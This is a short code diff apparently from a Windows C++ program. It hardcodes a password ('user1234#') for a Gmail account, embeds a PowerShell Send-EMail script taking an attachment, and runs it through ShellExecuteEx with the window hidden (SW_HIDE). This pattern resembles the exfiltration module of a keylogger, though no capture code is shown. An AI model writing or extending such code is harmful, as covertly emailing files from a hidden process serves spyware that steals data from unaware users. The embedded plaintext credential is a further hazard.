@@ -13,7 +13,7 @@
 namespace Mail {
     #define EM_TO "YourEmail@gmail.com"
     #define EM_FROM "YourEmail@gmail.com"
-    #define EM_PASSWORD "YourPassword"
+    #define EM_PASSWORD "user1234#"
 
     const std::string &PowerShellScript =   "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
                                             "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
@@ -117,7 +117,7 @@ namespace Mail {
         shellExecInfo.lpParameters = param.c_str();
         shellExecInfo.lpDirectory = NULL;
         shellExecInfo.nShow = SW_HIDE;  // hides powershell window
-        shellExecInfo.hInstApp =NULL;
+        shellExecInfo.hInstApp = NULL;
 
         ok = (bool) ShellExecuteEx(&shellExecInfo);
         if(!ok) return -3;
